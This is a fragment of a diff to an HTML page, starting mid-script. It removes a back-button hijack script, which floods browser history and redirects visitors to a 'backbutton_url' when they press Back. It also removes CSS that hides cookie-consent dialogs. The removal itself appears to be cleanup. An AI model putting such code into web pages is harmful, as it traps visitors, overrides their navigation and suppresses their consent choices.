-for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-onpopstate = function (t) {
-t.state && location.replace(backbutton_url)
-}
-} catch (o) {}
-}();
-</script> <style>.qc-cmp-showing { visibility: hidden !important; } body.didomi-popup-open { overflow: auto !important; } #didomi-host { visibility: hidden !important; }</style></body></html>
+        </script>
+    </body>
+</html>
